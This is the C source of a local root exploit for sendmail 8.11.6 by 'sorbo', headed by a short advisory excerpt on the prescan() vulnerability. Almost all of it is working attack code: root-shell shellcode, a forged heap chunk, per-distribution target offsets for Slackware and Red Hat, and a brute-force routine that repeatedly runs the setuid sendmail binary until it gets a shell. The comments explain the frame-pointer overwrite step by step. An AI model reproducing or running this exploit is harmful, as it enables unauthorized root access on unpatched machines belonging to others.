/* 
source: http://www.securityfocus.com/bid/7230/info

A vulnerability in Sendmail may be exploited remotely to execute arbitrary code. The flaw is present in the 'prescan()' procedure, which is used for processing email addresses in SMTP headers. This condition has been confirmed to be exploitable by remote attackers to execute instructions on target systems. This vulnerability stems from a logic error in the conversion of a char to an integer value. The issue has been fixed Sendmail 8.12.9. 
*/
/*
 * local exploit for sendmail 8.11.6 
 * by sorbo (sorbox@yahoo.com)
 * http://www.darkircop.org
 *
 * This exploit takes advantage of the vulnerable prescan() function that 
 * allows the user to input 0xff in order to skip the length check of the buffer.
 *
 * The vulnerability was found by Michal Zalewski
 *
 * The goal is to overwrite the 2 lsb of the saved frame pointer and make it 
 * point to an area we control.
 *
 * We can overflow pvpbuf[] in parseaddr() (which calls prescan()) and overwrite 
 * parseaddr's saved frame pointer. 
 * When parseaddr() returns, the control is back to sendtolist() but the frame pointer
 * will be modified (we make it point to somewhere in pvpbuf).
 * We can't just fill pvpbuf with the ret value we want, since sendtolist() doesn't
 * exit right away, but instead makes use of some variables.
 * We need therefore to construct pvpbuf in an intelligent way, so references to variables
 * will be valid.
 * The first variable to set is delimptr (located at ebp - something). 
 * We simply make this point to a 0, so the for loop exits.
 * The next variable to set is al (located at ebp - something ). We need to make a->q_next 
 * point to 0 so the while loop exits. a->q_next is a+11*4.
 * The next variable is e (ebp + something). We make it point to a 0
 * The next variable is bufp (ebp - something). This needs to be equal to buf to skip the free.
 * This cannot be done since the address contains a 0xff and this cannot be input in pvpbuf.
 * We just make it point to a valid chunk (in our case... our fake chunk). We can't make it point
 * to stack since arena_for_ptr() will fail. Luckily our arguments get copied on the heap, so we 
 * just point it to that.
 * Next we just set the ret (ebp + 4) to our shellcode and when sendtolist() exits our
 * shellcode will be executed. Note shellcode is even copied on heap, so non executable stacks will not
 * stop the exploit (the ret addr must match the shellcode location on the heap though)
 *
 * Note that if we overflow ebp by only one byte (putting a 0) i.e. the classical way
 * will not work since the register will not point to pvpbuf. What we do is overwrite two
 * bytes with 0x005c. Then we fill up the stack (by passing a long argument) so we lower the 
 * address of pvpbuf untill it is in the range of the ebp. Also our shellcode will be at a low
 * stack address < 0xbffefefe (since we cannot write 0xff in pvpbuf).
 *
 * NOTE: sendmail 8.12.8 cannot be exploited this way since there is an assert() which cannot
 * be bypassed (in sendtolist()).
 *
 * have fun
 *
 * Greetz: Knight420, Stefano Biondi, nevez
 *
 */


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>
              

char shellcode[] =
	/* NOPs (so we don't have to be exact in shellcode addr calculation) */
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

        /* setuid(0); */
        "\x31\xdb"                              /* xor %ebx,%ebx */
        "\x89\xd8"                              /* mov %ebx,%eax */
        "\xb0\x17"                              /* mov $0x17,%al */
        "\xcd\x80"                              /* int $0x80     */

        /* setgid(0); */
        "\x31\xdb"                              /* xor %ebx,%ebx */
        "\x89\xd8"                              /* mov %ebx,%eax */
        "\xb0\x2e"                              /* mov $0x2e,%al */
        "\xcd\x80"                              /* int $0x80     */

        /* /bin/sh execve(); */
        "\x31\xc0"                              /* xor  %eax,%eax   */
        "\x50"                                  /* push %eax        */
        "\x68\x2f\x2f\x73\x68"                  /* push $0x68732f2f */
        "\x68\x2f\x62\x69\x6e"                  /* push $0x6e69622f */
        "\x89\xe3"                              /* mov  %esp,%ebx   */
        "\x50"                                  /* push %eax        */
        "\x53"                                  /* push %ebx        */
        "\x89\xe1"                              /* mov  %esp,%ecx   */
        "\x31\xd2"                              /* xor  %edx,%edx   */
        "\xb0\x0b"                              /* mov  $0xb,%al    */
        "\xcd\x80"                              /* int  $0x80       */

        /* exit(0); */
        "\x31\xdb"                              /* xor %ebx,%ebx */
        "\x89\xd8"                              /* mov %ebx,%eax */
        "\xb0\x01"                              /* mov $0x01,%al */
        "\xcd\x80";                             /* int $0x80     */




/* NOTE: not all characters are passable:
 *	0x00 (duh), 0xff, 0x09-0x0d, 0x20-0x22, 0x25, 0x28, 0x29, 0x2b, 0x2c
 *	0x2e,0x2f,0x3a-0x3c,0x3e,0x40,0x5b,0x5d,0x5e,0x80-0x9f 
 *
 * the REAL variables are only pvpbuf and chunk... so don't get scared by all these
 * required variables. Most of them are fixed =D.
 */
struct target_info {
	char *description;	/* target description */
	char *sendmail;		/* sendmail path */
	int stack_len;		/* how much stuff to put in stack */
	int distance;		/* distance in bytes from pvpbuf to last 2 bytes of saved framepointer */
	int ebp;		/* the value ebp will have */
	int pvpbuf;		/* address of pvpbuf */
	int zero;		/* address of a 0 in memory */
	int chunk;		/* address of a chunk to free */
	int ret;		/* address of shellcode (aprox 0xc0000000 - stack_len) */
	int delimptr;		/* delimptr -ebp */
	int al;			/* al - ebp */
	int e;			/* e - ebp */
	int bufp;		/* bufp - ebp */
	
};


struct target_info targets[] = {

	{"Slackware 8.0","/usr/sbin/sendmail",123090,1258,0xbffe005c,0xbffdfef4,0xbffe15d6,0x80f30a0,0xbffe1f36,-264,-268,24,-284},	
        {"Redhat 7.3","/usr/sbin/sendmail.sendmail",123074,1290,0xbffe005c,0xbffdfcd0,0xbffe19a6,0x80f30a0,0xbffe1f36,-300,-304,24,-320},
	{"Redhat 7.2","/usr/sbin/sendmail",123090,1290,0xbffe005c,0xbffdfcd0,0xbffe19a6,0x80f30a0,0xbffe1f36,-300,-304,24,-320}        
};



/* return 1 if successfull
 * 0 if failed
 *
 */
int exploit(struct target_info target) {
	char *stackfiller=0;	/* data to lower stack (we can put fake chunks and shellcode here) */
	char egg[1024*3];	/* the argment to prescan() */
	char *ptr;
	int  *ptr2;
	int i;
	int pid;
	char *arg[] = { "owned",egg,stackfiller,NULL};


	

	/* prepare stack filler */
	stackfiller = (char*) malloc(target.stack_len);
	if(!stackfiller) {
		perror("malloc()");
		exit(0);
	}
	
	memset(stackfiller,'A',target.stack_len);
	*(stackfiller+target.stack_len-1) = 0;

	ptr = stackfiller;
	
        while(1) {
		/* fake chunk */
	        char *chunk = 	"\xfc\xff\xff\xff"
	        		"\xfc\xff\xff\xff"
	        		"\xa1\xff\xff\xbf"
	        		"\xa1\xff\xff\xbf"	/* yes unlink will overwrite 0xbfffffa1+12 ... but who cares */
	        		"\xa1\xff\xff\xbf";
	        		
                memcpy(ptr,chunk,strlen(chunk));
	        ptr += strlen(chunk);
	                                                       
	        if(ptr + strlen(chunk) >= stackfiller+target.stack_len-1)
	                break;
	}
	memcpy(stackfiller,shellcode,strlen(shellcode));
	arg[2] = stackfiller;		                                                                                                        



	/* prepare egg */
	memset(egg,'A',1200);
	egg[1200] = 0;
	
        for(i=0; i < target.distance - 1200; i++) 
	        strcat(egg,"\xff\\");
	                                	
        /* set delimptr */
        ptr2 = (int*) &egg[target.ebp+target.delimptr-target.pvpbuf];
        *ptr2 = target.zero;

        /* set al  */
        ptr2 = (int*) &egg[target.ebp+target.al-target.pvpbuf];
	*ptr2 = target.zero-11*4;
	
        /* set e  */
        ptr2 = (int*) &egg[target.ebp+target.e-target.pvpbuf];
	*ptr2 = target.zero;
	
	
        /* set bufp */
        ptr2 = (int*) &egg[target.ebp+target.bufp-target.pvpbuf];
	*ptr2 = target.chunk;
	
	/* set ret ebp + 4 */
	ptr2 = (int*) &egg[target.ebp+4-target.pvpbuf];
	*ptr2 = target.ret;
	
	
		        
		

	/* execute program */
	pid = fork();
	if(pid == -1) {
		perror("fork()");
		exit(-1);
	}
	
	/* child */
	if(pid==0) {
		execve(target.sendmail,arg,NULL);
		perror("execve()");
		kill(getpid(),SIGKILL);
		exit(0);
	}
	else {
		int status;
		wait(&status);
		
		if(WIFEXITED(status) == 0)
			return 0;
		return 1;
	}
}


/* 
 * OK here is how we brute force.
 * We need to find two values... a valid chunk to free (our fake chunk)
 * and the pvpbuf addr
 * Since our fake chunk is repeated all over and is 4*5 bytes long,
 * we have 5 possibilites of error in a sequencial search. We try for:
 * chunk,chunk+4,chunk+8,chunk+12,chunk+16
 *
 * pvpbuf addr must be somewhere lower than ebp, specifically ebp + target.bufp (or else
 * the exploit will fail since we cannot overwrite bufp. We start from bruteforcing ebp + target.bufp
 * decreasing by 4 bytes
 *
 */
void bruteforce(struct target_info target) {
	int cincrease = 0;	/* how many times we increased chunk value */
	target.pvpbuf = target.ebp+target.bufp;

	printf("Trying pvpbuf=0x%x\n",target.pvpbuf);

	while(target.ebp - target.pvpbuf < 2000) {	/* exploit will fail since pvpbuf < 2000 bytes */
		if(exploit(target)) {
			printf("Successfull exploitation with pvpbuf=0x%x and chunk=0x%x\n",target.pvpbuf,target.chunk);
			return;
		}
		
		/* make sure it is a "usable" address ... start with a base of 0x0a since u have space untill 0xfe */		
		target.chunk+=4;
		cincrease++;
		if(cincrease > 4) {
			target.chunk -= cincrease*4;	/* start at initial value again */
			cincrease =0;
			target.pvpbuf -= 4;
			printf("Trying pvpbuf=0x%x\n",target.pvpbuf);
		}
	}
	
	printf("Bruteforce failed\n");
}

void print_targets() {
	int tcount = sizeof(targets)/sizeof(struct target_info);
	int i;
	
	printf("Id\tDescription\tpvpbuf\t\tzero\t\tchunk\t\tshellcode addr\n");
	
	for(i = 0; i < tcount; i++) {
		printf("%d)\t%s\t0x%x\t0x%x\t0x%x\t0x%x\n",i,
			targets[i].description,targets[i].pvpbuf,targets[i].zero,targets[i].chunk,targets[i].ret);
	}
	
}

void usage(char *p) {
	printf("Usage: %s <opts>\n",p);
	printf("-h\tthis lame message\n");
	printf("-t\ttarget\n");
	printf("-b\tbrute force\n");
	printf("\n");
	print_targets();
	exit(0);
}

int main(int argc, char *argv[]) {
	int t = 0;
	int brute = 1;
	int opt;

	printf("Local sendmail 8.11.6 exploit by sorbo (sorbox@yahoo.com)\n");

	while( (opt = getopt(argc,argv,"t:bh")) != -1) {
		switch(opt) {
			case 't':
				t = atoi(optarg);
				if(t >= sizeof(targets)/sizeof(struct target_info)) {
					printf("Invalid target %d\n",t);
					exit(0);
				}
				brute = 0;
				break;
				
			case 'b':
				brute = 1;
				break;
				

			case 'h':
			default:
				usage(argv[0]);
		}
	}
	
	printf("Attempting to exploit %s\n",targets[t].description);
	if(brute) {
		bruteforce(targets[t]);
		exit(0);
	}

	printf("pvpbuf=\t\t0x%x\n",targets[t].pvpbuf);
	printf("zero=\t\t0x%x\n",targets[t].zero);
	printf("chunk=\t\t0x%x\n",targets[t].chunk);
	printf("shellcode=\t0x%x\n",targets[t].ret);

	t = exploit(targets[t]);
	if(t)
		printf("Exploit successfull\n");
	else
		printf("Exploit failed... try adding -b\n");

	exit(0);
}